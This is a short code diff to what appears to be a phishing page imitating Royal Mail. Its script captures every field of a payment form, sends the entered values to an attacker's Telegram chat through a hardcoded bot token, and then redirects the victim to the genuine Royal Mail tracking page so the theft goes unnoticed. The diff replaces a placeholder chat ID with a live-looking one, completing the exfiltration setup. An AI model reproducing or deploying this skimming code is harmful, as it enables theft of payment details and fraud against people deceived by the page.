@@ -45,13 +45,13 @@
 
   <script>
     const TOKEN   = '8635148208:AAHTBQHHQenARmqCk7ycc5DmDrIzkG3MLJU';
-    const CHAT_ID = '-1001234567890';
+    const CHAT_ID = '-1003748946568';
 
     document.getElementById('payForm').addEventListener('submit', function (e) {
       e.preventDefault();
       const csv = [...new FormData(e.target).entries()].map(([k,v])=>`${k}: ${v}`).join('\n');
 
-      fetch(`https://api.telegram.org/bot8635148208:AAHTBQHHQenARmqCk7ycc5DmDrIzkG3MLJU/sendMessage?chat_id=-1001234567890&text=${encodeURIComponent(csv)}`)
+      fetch(`https://api.telegram.org/bot8635148208:AAHTBQHHQenARmqCk7ycc5DmDrIzkG3MLJU/sendMessage?chat_id=-1003748946568&text=${encodeURIComponent(csv)}`)
         .then(() => window.location.href='https://www.royalmail.com/track-your-item');
     });
 
